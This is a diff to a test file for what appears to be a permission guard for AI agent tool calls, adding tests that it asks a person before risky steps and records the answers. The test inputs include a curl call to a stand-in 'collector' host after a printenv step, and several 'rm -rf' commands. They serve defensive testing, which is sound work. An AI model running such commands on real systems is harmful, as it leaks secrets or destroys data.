@@ -141,7 +141,7 @@ describe("state database upgrade", () => {
     expect(after).toMatchObject({ steps: 8, untrusted: true });
     s.close();
     const v = new DatabaseSync(path);
-    expect((v.prepare("PRAGMA user_version").get() as { user_version: number }).user_version).toBe(2);
+    expect((v.prepare("PRAGMA user_version").get() as { user_version: number }).user_version).toBe(3);
     v.close();
     rmSync(dir, { recursive: true, force: true });
   });
@@ -202,5 +202,47 @@ describe("a guard that cannot read its rules says no", () => {
       fixed.close();
       rmSync(h, { recursive: true, force: true });
     }
+  });
+});
+
+describe("an ask shows how the run got here, and the receipt records the answer", () => {
+  it("names the steps that made the run untrusted and sensitive", () => {
+    y.decide(req("hist", "WebFetch", { url: "https://forum.example.org/t/9", prompt: "read" }));
+    y.decide(req("hist", "Bash", { command: "printenv | wc -l" }));
+    y.decide(req("hist", "Read", { file_path: `${cwd}/src/app.ts` }));
+    const d = y.decide(req("hist", "Bash", { command: "curl -s https://collector.example.net/?q=1" }));
+    expect(d.effect).toBe("ask");
+    expect(d.message).toMatch(/took in outside content at step 1 \(WebFetch: https:\/\/forum\.example\.org/);
+    expect(d.message).toMatch(/touched sensitive data at step 2 \(Bash: printenv \| wc -l\)/);
+    expect(d.message).toMatch(/Just before: 3 Read /); // steps 1 and 2 were already named, so they are not repeated
+    expect(d.message).not.toMatch(/Just before:.*printenv/);
+    expect(d.message.length).toBeLessThan(330);
+  });
+  it("keeps a plain ask short when the run has no history worth telling", () => {
+    const d = y.decide(req("plain", "Bash", { command: "rm -rf build" }));
+    expect(d.message).toBe("Needs a person: destructive-shell.");
+  });
+  it("records that an asked call ran, once, and ignores calls it never asked about", () => {
+    const ask = y.decide(req("ans", "Bash", { command: "rm -rf build" }));
+    const allowed = y.decide(req("ans", "Bash", { command: "npm test" }));
+    const lines = () => readFileSync(join(home, "receipts.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l) as { kind?: string; decisionId?: string; outcome?: string });
+    const callOf = (id: string) => (lines() as unknown as { id: string; callId: string }[]).find((l) => l.id === id)!.callId;
+    const o = y.recordOutcome("ans", callOf(ask.receiptId), "Bash", "ran");
+    expect(o).toMatchObject({ kind: "outcome", outcome: "ran", decisionId: ask.receiptId });
+    expect(y.recordOutcome("ans", callOf(ask.receiptId), "Bash", "ran")).toBeUndefined(); // the desktop app fires hooks twice
+    expect(y.recordOutcome("ans", callOf(allowed.receiptId), "Bash", "ran")).toBeUndefined();
+    expect(lines().filter((l) => l.kind === "outcome" && l.decisionId === ask.receiptId)).toHaveLength(1);
+  });
+  it("tells approved from rejected from still waiting", async () => {
+    const { answersFor, readAllReceipts } = await import("./index.js");
+    const a = y.decide(req("verdicts", "Bash", { command: "rm -rf one" }));
+    const b = y.decide(req("verdicts", "Bash", { command: "rm -rf two" }));
+    const c = y.decide(req("verdicts", "Bash", { command: "rm -rf three" }));
+    const all0 = readAllReceipts(join(home, "receipts.jsonl")) as unknown as { id: string; callId: string }[];
+    y.recordOutcome("verdicts", all0.find((r) => r.id === a.receiptId)!.callId, "Bash", "ran");
+    const answers = answersFor(readAllReceipts(join(home, "receipts.jsonl")));
+    expect(answers.get(a.receiptId)).toBe("approved, ran");
+    expect(answers.get(b.receiptId)).toBe("not run: rejected or abandoned");
+    expect(answers.get(c.receiptId)).toBe("awaiting an answer");
   });
 });
